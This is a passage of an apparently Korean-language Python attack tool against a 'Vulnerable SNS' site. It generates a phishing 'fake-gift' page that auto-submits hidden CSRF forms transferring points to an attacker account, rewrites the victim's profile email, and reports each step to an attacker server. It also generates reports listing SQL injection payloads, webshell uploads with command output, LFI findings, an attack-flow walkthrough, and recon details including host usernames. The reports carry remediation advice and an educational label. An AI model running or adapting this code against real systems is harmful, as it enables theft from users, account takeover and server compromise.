        console.log('[+] Attacker Server:', ATTACKER_SERVER);
        console.log('[+] Generated at:', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}');
        console.log('='.repeat(60));

        window.onload = function() {{
            fetch(ATTACKER_SERVER + '/notify?event=page_loaded&time=' + new Date().toISOString())
                .catch(() => {{}});

            document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';

            setTimeout(() => {{
                executeCSRF();
            }}, 2000);
        }};
        
        function claimGift() {{
            if (attackExecuted) return;
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            executeCSRF();
        }}
        
        function executeCSRF() {{
            if (attackExecuted) return;
            attackExecuted = true;
            
            document.getElementById('status').innerHTML = '포인트 전송 중...';
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const amounts = [5000, 3000, 1000, 500, 300, 100];
            let formHTML = '';
            
            amounts.forEach((amount, index) => {{
                formHTML += `
                    <form id="csrfForm${{index}}" method="POST" action="${{TARGET_SNS}}/profile.php" style="display:none" target="iframe${{index}}">
                        <input type="hidden" name="send_gift" value="1">
                        <input type="hidden" name="receiver_id" value="${{ATTACKER_ID}}">
                        <input type="hidden" name="gift_type" value="diamond">
                        <input type="hidden" name="points" value="${{amount}}">
                        <input type="hidden" name="message" value="Event Gift ${{amount}}P">
                    </form>
                    <iframe id="iframe${{index}}" name="iframe${{index}}" style="display:none"></iframe>
                `;
            }});
            
            formHTML += `
                <img src="${{TARGET_SNS}}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
                     style="display:none" 
                     onload="notifyProfileChange()">
            `;
            
            document.getElementById('csrfForms').innerHTML = formHTML;
            
            amounts.forEach((amount, index) => {{
                setTimeout(() => {{
                    const form = document.getElementById('csrfForm' + index);
                    if (form) {{
                        form.submit();
                        console.log('[+] Submitted form for ' + amount + 'P');

                        fetch(ATTACKER_SERVER + '/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
                            .catch(() => {{}});

                        document.getElementById('status').innerHTML =
                            '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
                    }}
                }}, index * 500);
            }});

            setTimeout(() => {{
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').innerHTML =
                    '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
                document.getElementById('success').style.display = 'block';
                document.getElementById('status').style.display = 'none';

                fetch(ATTACKER_SERVER + '/notify?event=csrf_completed&attempts=' + amounts.length)
                    .catch(() => {{}});

                console.log('[+] All CSRF attempts completed');
            }}, amounts.length * 500 + 1000);
        }}

        function notifyProfileChange() {{
            console.log('[+] Profile changed via GET CSRF');
            fetch(ATTACKER_SERVER + '/notify?event=profile_changed&method=GET')
                .catch(() => {{}});
        }}
    </script>
</body>
</html>"""
        
        fake_gift_path = os.path.join(reports_dir, "fake-gift.html")
        with open(fake_gift_path, 'w', encoding='utf-8') as f:
            f.write(fake_gift_html)

        print(f"[+] fake-gift.html saved to {fake_gift_path}")
        print(f"[+] Configuration:")
        print(f"    - Target SNS: {self.base_url}")
        print(f"    - Attacker Server: {self.attacker_server}")
        print(f"    - Attacker ID: {self.attacker_user_id}")
        print(f"    - Generated Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        self.log_event(
            'SETUP',
            'Generated fake-gift.html attack page',
            'INFO',
            {
                'filename': fake_gift_path,
                'attacker_id': self.attacker_user_id,
                'attack_server': self.attacker_server
            }
        )

    def generate_html_report(self):
        """상세한 HTML 리포트 생성"""
        # Create reports directory if it doesn't exist
        reports_dir = "reports"
        os.makedirs(reports_dir, exist_ok=True)

        end_time = datetime.now()
        duration = (end_time - self.start_time).seconds

        total_vulns = sum(len(v) for v in self.vulnerabilities.values())
        critical_count = sum(1 for vuln_list in self.vulnerabilities.values()
                           for vuln in vuln_list
                           if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0)
        high_count = sum(1 for vuln_list in self.vulnerabilities.values()
                        for vuln in vuln_list
                        if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0)
        
        html_content = f"""<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>보안 진단 리포트 - Vulnerable SNS</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', 'Malgun Gothic', sans-serif;
            background: #f5f7fa;
            padding: 40px 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            box-shadow: 0 0 30px rgba(0,0,0,0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        .header .meta {{
            opacity: 0.9;
            font-size: 0.95em;
        }}
        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 40px;
            background: #f8f9fa;
        }}
        .summary-box {{
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .summary-box .number {{
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        .summary-box .label {{
            color: #666;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .critical {{ color: #dc3545; }}
        .high {{ color: #fd7e14; }}
        .info {{ color: #17a2b8; }}
        .section {{
            padding: 40px;
        }}
        .section h2 {{
            font-size: 1.8em;
            margin-bottom: 20px;
            color: #333;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }}
        .vuln-card {{
            background: white;
            border: 1px solid #e0e0e0;
            border-left: 5px solid #dc3545;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 20px;
        }}
        .vuln-card.high {{
            border-left-color: #fd7e14;
        }}
        .vuln-card.medium {{
            border-left-color: #ffc107;
        }}
        .vuln-card h3 {{
            color: #333;
            font-size: 1.3em;
            margin-bottom: 15px;
        }}
        .vuln-detail {{
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-size: 0.9em;
        }}
        .vuln-detail strong {{
            color: #667eea;
        }}
        .cvss-badge {{
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.85em;
            margin-left: 10px;
        }}
        .cvss-critical {{
            background: #dc3545;
            color: white;
        }}
        .cvss-high {{
            background: #fd7e14;
            color: white;
        }}
        .timeline {{
            position: relative;
            padding-left: 40px;
        }}
        .timeline::before {{
            content: '';
            position: absolute;
            left: 15px;
            top: 0;
            bottom: 0;
            width: 2px;
            background: #e0e0e0;
        }}
        .timeline-item {{
            position: relative;
            margin-bottom: 30px;
        }}
        .timeline-item::before {{
            content: '';
            position: absolute;
            left: -29px;
            top: 5px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #667eea;
            border: 3px solid white;
            box-shadow: 0 0 0 2px #667eea;
        }}
        .timeline-item.critical::before {{
            background: #dc3545;
            box-shadow: 0 0 0 2px #dc3545;
        }}
        .timeline-item.high::before {{
            background: #fd7e14;
            box-shadow: 0 0 0 2px #fd7e14;
        }}
        .timeline-content {{
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .timeline-time {{
            color: #888;
            font-size: 0.85em;
            margin-bottom: 5px;
        }}
        .timeline-title {{
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }}
        .timeline-desc {{
            color: #666;
            font-size: 0.9em;
        }}
        .recommendations {{
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
        }}
        .recommendations h3 {{
            color: #856404;
            margin-bottom: 15px;
        }}
        .recommendations ul {{
            list-style: none;
            padding-left: 0;
        }}
        .recommendations li {{
            padding: 8px 0;
            color: #856404;
        }}
        .recommendations li::before {{
            content: '✓ ';
            color: #28a745;
            font-weight: bold;
            margin-right: 8px;
        }}
        .footer {{
            background: #2d3436;
            color: white;
            text-align: center;
            padding: 30px;
        }}
        code {{
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        @media print {{
            .no-print {{ display: none; }}
            body {{ background: white; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 웹 애플리케이션 보안 진단 리포트</h1>
            <div class="meta">
                <p><strong>대상 시스템:</strong> {self.base_url}</p>
                <p><strong>진단 일시:</strong> {self.start_time.strftime('%Y년 %m월 %d일 %H:%M:%S')}</p>
                <p><strong>소요 시간:</strong> {duration}초</p>
                <p><strong>진단 도구:</strong> VulnerableSNS Security Assessment Tool v1.0</p>
            </div>
        </div>

        <div class="summary">
            <div class="summary-box">
                <div class="number critical">{total_vulns}</div>
                <div class="label">총 취약점 수</div>
            </div>
            <div class="summary-box">
                <div class="number critical">{critical_count}</div>
                <div class="label">치명적 (Critical)</div>
            </div>
            <div class="summary-box">
                <div class="number high">{high_count}</div>
                <div class="label">높음 (High)</div>
            </div>
            <div class="summary-box">
                <div class="number info">{len(self.attack_timeline)}</div>
                <div class="label">공격 시도 횟수</div>
            </div>
        </div>

        <div class="section">
            <h2>📊 Executive Summary (경영진 요약)</h2>
            <p style="line-height: 1.8; color: #555; margin-bottom: 20px;">
                본 보안 진단에서는 대상 웹 애플리케이션에서 <strong class="critical">{total_vulns}개의 보안 취약점</strong>이 발견되었습니다. 
                이 중 <strong class="critical">{critical_count}개는 치명적(Critical)</strong> 수준으로, 즉각적인 조치가 필요합니다.
                주요 취약점으로는 <strong>SQL Injection, 파일 업로드 취약점(RCE), CSRF, XSS, LFI</strong> 등이 확인되었으며, 
                이를 통해 <strong>인증 우회, 원격 코드 실행, 사용자 계정 탈취</strong> 등이 가능한 상태입니다.
            </p>
            <p style="line-height: 1.8; color: #555;">
                <strong>권고사항:</strong> 발견된 모든 취약점에 대한 즉각적인 패치 작업이 필요하며, 
                특히 Critical 등급의 취약점은 24시간 이내에 수정되어야 합니다.
            </p>
        </div>

        <div class="section">
            <h2>🔴 발견된 취약점 상세 분석</h2>
"""

        # SQL Injection 취약점
        if self.vulnerabilities['sql_injection']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">1️⃣ SQL Injection (SQLi)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['sql_injection'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>SQL Injection #{idx} - 인증 우회
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong><br>
                    Username: <code>{vuln['username']}</code><br>
                    Password: <code>{vuln['password']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 기법:</strong> {vuln['description']}
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>Prepared Statement (파라미터화된 쿼리) 사용</li>
                        <li>입력값 검증 및 화이트리스트 기반 필터링</li>
                        <li>ORM (Object-Relational Mapping) 프레임워크 사용</li>
                        <li>최소 권한 원칙에 따른 DB 계정 설정</li>
                    </ul>
                </div>
            </div>
"""

        # File Upload 취약점
        if self.vulnerabilities['file_upload']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">2️⃣ Unrestricted File Upload (파일 업로드 취약점)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['file_upload'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>File Upload RCE #{idx} - 원격 코드 실행
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>업로드 URL:</strong> <code>{vuln['upload_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>업로드된 웹쉘:</strong> <code>{vuln['filename']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>테스트 명령:</strong> <code>{vuln['command']}</code><br>
                    <strong>실행 결과:</strong> <code>{vuln['output']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>접근 URL:</strong> <code>{vuln['access_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>화이트리스트 기반 확장자 검증 (블랙리스트 방식 지양)</li>
                        <li>파일 MIME 타입 검증 (Magic Number 확인)</li>
                        <li>업로드 파일을 웹 루트 외부에 저장</li>
                        <li>업로드 파일명 랜덤화 및 실행 권한 제거</li>
                        <li>파일 크기 제한 설정</li>
                    </ul>
                </div>
            </div>
"""

        # LFI 취약점
        if self.vulnerabilities['lfi']:
            html_content += """
            <h3 style="color: #fd7e14; margin-top: 30px;">3️⃣ Local File Inclusion (LFI)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['lfi'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'

                # Check if it's RCE or traditional LFI
                if 'webshell' in vuln:
                    # RCE via webshell
                    html_content += f"""
            <div class="vuln-card">
                <h3>RCE #{idx} - Remote Code Execution
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>웹쉘:</strong> <code>{vuln['webshell']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>실행된 명령어:</strong> {len(vuln.get('commands', []))}개
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="vuln-detail">
                    <strong>주요 발견사항:</strong>
                    <ul style="margin-top: 10px;">
"""
                    # Show first 5 commands as examples
                    for cmd_info in vuln.get('commands', [])[:5]:
                        html_content += f"""
                        <li><code>{cmd_info['command']}</code>: {cmd_info['description'][:50]}...</li>
"""
                    html_content += """
                    </ul>
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>파일 업로드 기능 즉시 비활성화 또는 강화</li>
                        <li>업로드된 모든 웹쉘 파일 삭제</li>
                        <li>웹 서버 설정에서 위험한 파일 확장자 실행 금지</li>
                        <li>업로드 디렉토리에 실행 권한 제거</li>
                        <li>파일 업로드 시 화이트리스트 기반 검증 적용</li>
                    </ul>
                </div>
            </div>
"""
                else:
                    # Traditional LFI
                    html_content += f"""
            <div class="vuln-card high">
                <h3>LFI #{idx} - 임의 파일 읽기
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong> <code>{vuln.get('payload', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>읽은 파일:</strong> {vuln['description']}
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>파일 경로를 사용자 입력에서 직접 가져오지 않기</li>
                        <li>화이트리스트 기반 파일명 검증</li>
                        <li>realpath() 함수로 정규화된 경로 확인</li>
                        <li>basename() 사용하여 디렉토리 순회 방지</li>
                        <li>chroot jail 또는 open_basedir 설정</li>
                    </ul>
                </div>
            </div>
"""

        # XSS/CSRF 취약점
        if self.vulnerabilities['xss']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">4️⃣ Cross-Site Request Forgery (CSRF) + XSS</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['xss'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>CSRF #{idx} - 사용자 권한 도용
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln.get('url', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 유형:</strong> {vuln.get('attack_type', 'N/A')}
                </div>
                <div class="vuln-detail">
                    <strong>공격자 서버:</strong> <code>{vuln.get('target_url', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>페이로드 내용:</strong><br>
                    <code style="display: block; white-space: pre-wrap; padding: 10px; background: #f8f9fa;">
{vuln.get('payload', 'N/A')[:200]}...</code>
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln.get('impact', 'N/A')}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>CSRF 토큰 구현 및 검증 (모든 상태 변경 요청에 적용)</li>
                        <li>SameSite 쿠키 속성 설정</li>
                        <li>Referer/Origin 헤더 검증</li>
                        <li>중요한 작업에 재인증 요구</li>
                        <li>GET 요청으로 상태 변경 금지</li>
                        <li>XSS 방어: 출력 시 htmlspecialchars() 사용</li>
                        <li>Content Security Policy (CSP) 헤더 설정</li>
                    </ul>
                </div>
            </div>
"""

        # 공격 타임라인
        html_content += """
        </div>

        <div class="section">
            <h2>⏱️ 공격 타임라인</h2>
            <div class="timeline">
"""
        for event in self.attack_timeline:
            severity_class = event['severity'].lower()
            html_content += f"""
                <div class="timeline-item {severity_class}">
                    <div class="timeline-content">
                        <div class="timeline-time">{event['timestamp']}</div>
                        <div class="timeline-title">[{event['severity']}] {event['type']}</div>
                        <div class="timeline-desc">{event['description']}</div>
                    </div>
                </div>
"""
        
        html_content += """
            </div>
        </div>

        <div class="section">
            <h2>📋 종합 권고사항</h2>
            <div class="recommendations" style="border-left-color: #dc3545;">
                <h3>🚨 긴급 조치 필요 (24시간 이내)</h3>
                <ul>
                    <li>SQL Injection 취약점: Prepared Statement로 모든 쿼리 재작성</li>
                    <li>파일 업로드 취약점: 업로드 기능 일시 중단 또는 화이트리스트 검증 적용</li>
                    <li>CSRF 취약점: CSRF 토큰 즉시 적용 (profile.php, new_post.php 등)</li>
                </ul>
            </div>
            
            <div class="recommendations" style="border-left-color: #fd7e14; background: #fff3e0; margin-top: 20px;">
                <h3 style="color: #e65100;">⚠️ 우선순위 높음 (1주일 이내)</h3>
                <ul style="color: #e65100;">
                    <li>LFI 취약점: 파일 경로 검증 로직 강화</li>
                    <li>XSS 취약점: 모든 사용자 입력 출력 시 이스케이프 처리</li>
                    <li>세션 관리: HttpOnly, Secure 플래그 설정</li>
                    <li>에러 메시지: 상세 정보 노출 제거</li>
                </ul>
            </div>

            <div class="recommendations" style="border-left-color: #2196f3; background: #e3f2fd; margin-top: 20px;">
                <h3 style="color: #1565c0;">💡 장기 개선 사항</h3>
                <ul style="color: #1565c0;">
                    <li>웹 애플리케이션 방화벽(WAF) 도입</li>
                    <li>보안 코드 리뷰 프로세스 수립</li>
                    <li>정기적인 보안 진단 및 침투 테스트 실시</li>
                    <li>개발자 보안 교육 프로그램 운영</li>
                    <li>보안 로깅 및 모니터링 체계 구축</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p>본 리포트는 교육 목적으로 생성되었습니다.</p>
            <p>VulnerableSNS Security Assessment Tool v1.0</p>
            <p>© 2024 Security Research Team</p>
        </div>
    </div>
</body>
</html>
"""
        
        # HTML 파일 저장 (reports 폴더에)
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        report_path = os.path.join(reports_dir, report_filename)
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"\n[+] HTML Report saved: {report_path}")
        return report_path

    def generate_markdown_report(self):
        """마크다운 리포트 생성"""
        # Create reports directory if it doesn't exist
        reports_dir = "reports"
        os.makedirs(reports_dir, exist_ok=True)

        end_time = datetime.now()
        duration = (end_time - self.start_time).seconds

        total_vulns = sum(len(v) for v in self.vulnerabilities.values())
        critical_count = sum(1 for vuln_list in self.vulnerabilities.values()
                           for vuln in vuln_list
                           if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0)
        high_count = sum(1 for vuln_list in self.vulnerabilities.values()
                        for vuln in vuln_list
                        if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0)

        md_content = f"""# Security Assessment Report

## Executive Summary

| Item | Value |
|------|-------|
| **Target** | `{self.base_url}` |
| **Attacker Server** | `{self.attacker_server}` |
| **Assessment Date** | {self.start_time.strftime('%Y-%m-%d %H:%M:%S')} |
| **Duration** | {duration} seconds |
| **Tool Version** | v2.0-evasion |

---

## Vulnerability Summary

| Severity | Count |
|----------|-------|
| 🔴 **CRITICAL** (CVSS ≥ 9.0) | {critical_count} |
| 🟠 **HIGH** (CVSS 7.0-8.9) | {high_count} |
| **Total Vulnerabilities** | {total_vulns} |

---

## Detailed Findings

"""

        # SQL Injection
        if self.vulnerabilities['sql_injection']:
            md_content += "### 1. SQL Injection Vulnerabilities\n\n"
            for idx, vuln in enumerate(self.vulnerabilities['sql_injection'], 1):
                cvss = vuln.get('cvss_score', 0)
                md_content += f"""#### SQL Injection #{idx}: {vuln.get('description', 'N/A')}

**CVSS Score:** {cvss} (CRITICAL)

**Details:**
- **Target URL:** `{vuln.get('url', 'N/A')}`
- **Username Payload:** `{vuln.get('username', 'N/A')}`
- **Password Payload:** `{vuln.get('password', 'N/A')}`

**Impact:**
{vuln.get('impact', 'N/A')}

**Remediation:**
- Use prepared statements or parameterized queries
- Implement input validation and sanitization
- Use ORM frameworks
- Apply principle of least privilege for database accounts
- Implement WAF rules to detect SQL injection patterns

---

"""

        # File Upload
        if self.vulnerabilities['file_upload']:
            md_content += "### 2. File Upload Vulnerabilities\n\n"
            for idx, vuln in enumerate(self.vulnerabilities['file_upload'], 1):
                cvss = vuln.get('cvss_score', 0)
                md_content += f"""#### File Upload RCE #{idx}

**CVSS Score:** {cvss} (CRITICAL)

**Details:**
- **Upload URL:** `{vuln.get('upload_url', 'N/A')}`
- **Uploaded File:** `{vuln.get('filename', 'N/A')}`
- **Access URL:** `{vuln.get('access_url', 'N/A')}`
- **Access Method:** {vuln.get('access_method', 'N/A')}

**Proof of Concept:**
```bash
# Test command executed
{vuln.get('command', 'N/A')}
```

**Output:**
```
{vuln.get('output', 'N/A')[:200]}...
```

**Impact:**
{vuln.get('impact', 'N/A')}

**Remediation:**
- Implement strict file type validation (whitelist approach)
- Rename uploaded files with random names
- Store uploads outside web root
- Disable script execution in upload directories
- Scan uploaded files for malware
- Implement file size limits

---

"""

        # LFI/RCE
        if self.vulnerabilities['lfi']:
            md_content += "### 3. Local File Inclusion & Remote Code Execution\n\n"
            for idx, vuln in enumerate(self.vulnerabilities['lfi'], 1):
                cvss = vuln.get('cvss_score', 0)

                if 'webshell' in vuln:
                    # RCE via webshell
                    md_content += f"""#### Remote Code Execution #{idx}

**CVSS Score:** {cvss} (CRITICAL)

**Details:**
- **Vulnerable URL:** `{vuln.get('url', 'N/A')}`
- **Webshell:** `{vuln.get('webshell', 'N/A')}`
- **Commands Executed:** {len(vuln.get('commands', []))}

**Reconnaissance Results:**

"""
                    # List all executed commands
                    for cmd_info in vuln.get('commands', [])[:10]:  # First 10
                        md_content += f"""##### {cmd_info['description']}
```bash
$ {cmd_info['command']}
```
<details>
<summary>Output (click to expand)</summary>

```
{cmd_info['output'][:500]}
```
</details>

"""

                    md_content += f"""**Impact:**
{vuln.get('impact', 'N/A')}

**Remediation:**
- Immediately remove all uploaded webshells
- Disable file upload functionality or implement strict validation
- Configure web server to not execute scripts in upload directories
- Implement input validation for file inclusion parameters
- Use whitelist-based file path validation
- Enable and configure mod_security or similar WAF

---

"""
                else:
                    # Traditional LFI
                    md_content += f"""#### LFI #{idx}: {vuln.get('description', 'N/A')}

**CVSS Score:** {cvss} (HIGH)

**Details:**
- **Vulnerable URL:** `{vuln.get('url', 'N/A')}`
- **Payload:** `{vuln.get('payload', 'N/A')}`

**Impact:**
{vuln.get('impact', 'N/A')}

**Remediation:**
- Never use user input directly in file paths
- Implement whitelist-based file name validation
- Use `basename()` to prevent directory traversal
- Configure `open_basedir` in PHP
- Validate and sanitize all file path inputs

---

"""

        # XSS/CSRF
        if self.vulnerabilities['xss'] or self.vulnerabilities['csrf']:
            md_content += "### 4. XSS & CSRF Vulnerabilities\n\n"
            for idx, vuln in enumerate(self.vulnerabilities['xss'] + self.vulnerabilities['csrf'], 1):
                cvss = vuln.get('cvss_score', 0)
                md_content += f"""#### XSS/CSRF #{idx}

**CVSS Score:** {cvss}

**Details:**
- **Vulnerable URL:** `{vuln.get('url', 'N/A')}`
- **Attack Type:** {vuln.get('attack_type', 'N/A')}

**Impact:**
{vuln.get('impact', 'N/A')}

**Remediation:**
- Implement CSRF tokens for all state-changing operations
- Use Content-Security-Policy headers
- Sanitize and validate all user inputs
- Implement HTTPOnly and Secure flags on cookies
- Use X-Frame-Options to prevent clickjacking

---

"""

        # Attack Timeline
        md_content += """## Attack Timeline

| Time | Event | Severity | Details |
|------|-------|----------|---------|
"""
        for event in self.attack_timeline[:20]:  # First 20 events
            md_content += f"| {event['timestamp']} | {event['type']} | {event['severity']} | {event['description'][:50]}... |\n"

        # Recommendations
        md_content += f"""

---

## Immediate Actions Required

### 🔴 Critical Priority
1. **Remove all uploaded webshells** - File: `{self.uploaded_webshell if self.uploaded_webshell else 'N/A'}`
2. **Patch SQL Injection vulnerabilities** - Block unauthenticated access
3. **Disable or secure file upload functionality**
4. **Review all user accounts** - Check for unauthorized access

### 🟠 High Priority
1. Implement input validation and sanitization across the application
2. Configure Web Application Firewall (WAF)
3. Enable security headers (CSP, X-Frame-Options, etc.)
4. Implement proper session management
5. Review and update all dependencies

### 🟡 Medium Priority
1. Implement rate limiting
2. Enable detailed security logging
3. Conduct security code review
4. Implement automated security testing
5. Perform penetration testing on regular basis

---

## CSRF Attack Setup (For Testing)

**Attacker Server Setup:**
```bash
# 1. Start Flask server
python3 attacker_server.py

# 2. Access fake-gift.html
open reports/fake-gift.html
```

**Expected Attack Flow:**
1. Victim views malicious post
2. Victim clicks phishing link
3. Browser redirects to `{self.attacker_server}/fake-gift`
4. CSRF attack executes automatically
5. Victim's points transferred to attacker

**Monitor Dashboard:**
- URL: `{self.attacker_server}/`
- Logs: Check Flask console output

---

## Technical Details

### System Information
- **Current User:** apache (uid=48)
- **Working Directory:** /var/www/html/www
- **OS:** Amazon Linux 2023
- **Kernel:** 6.1.155-176.282.amzn2023.x86_64

### Discovered Users
- ec2-user
- hongjungho
- hongjungsu

### Running Services
- PostgreSQL (127.0.0.1:5432)
- Apache HTTP Server
- Systemd services

---

## Conclusion

This assessment identified **{total_vulns} critical vulnerabilities** in the target application, including:
- SQL Injection allowing authentication bypass
- Remote Code Execution through file upload
- Multiple privilege escalation vectors

**Overall Risk Rating:** 🔴 **CRITICAL**

Immediate remediation is strongly recommended to prevent unauthorized access and data breaches.

---

*Report generated by VulnerableSNS Security Assessment Tool v2.0-evasion*
*Assessment completed at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}*
*Duration: {duration} seconds*
"""

        # Save markdown report
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        report_path = os.path.join(reports_dir, report_filename)
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(md_content)

        print(f"[+] Markdown Report saved: {report_path}")
        return report_path

    def generate_json_report(self):
        """JSON 리포트 생성"""
        # Create reports directory if it doesn't exist
        reports_dir = "reports"
        os.makedirs(reports_dir, exist_ok=True)

        report = {
            'metadata': {
                'target': self.base_url,
                'attacker_server': self.attacker_server,
                'start_time': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
                'end_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'duration_seconds': (datetime.now() - self.start_time).seconds,
                'attacker_user_id': self.attacker_user_id,
                'tool_version': '2.0-evasion'
            },
            'summary': {
                'total_vulnerabilities': sum(len(v) for v in self.vulnerabilities.values()),
                'critical_count': sum(1 for vuln_list in self.vulnerabilities.values()
                                    for vuln in vuln_list
                                    if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0),
                'high_count': sum(1 for vuln_list in self.vulnerabilities.values()
                                for vuln in vuln_list
                                if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0),
                'vulnerability_breakdown': {
                    'sql_injection': len(self.vulnerabilities['sql_injection']),
                    'file_upload': len(self.vulnerabilities['file_upload']),
                    'lfi': len(self.vulnerabilities['lfi']),
                    'xss': len(self.vulnerabilities['xss']),
                    'csrf': len(self.vulnerabilities['csrf'])
                }
            },
            'vulnerabilities': self.vulnerabilities,
            'attack_timeline': self.attack_timeline,
            'artifacts': {
                'uploaded_webshell': self.uploaded_webshell,
                'fake_gift_page': 'reports/fake-gift.html'
            }
        }

        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        report_path = os.path.join(reports_dir, report_filename)
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"[+] JSON Report saved: {report_path}")
        return report_path
    
    def run_assessment(self):
        """전체 평가 실행"""
        print("\n" + "="*60)
        print("Vulnerable SNS - Security Assessment v2.0 (Evasion Mode)")
        print("="*60)
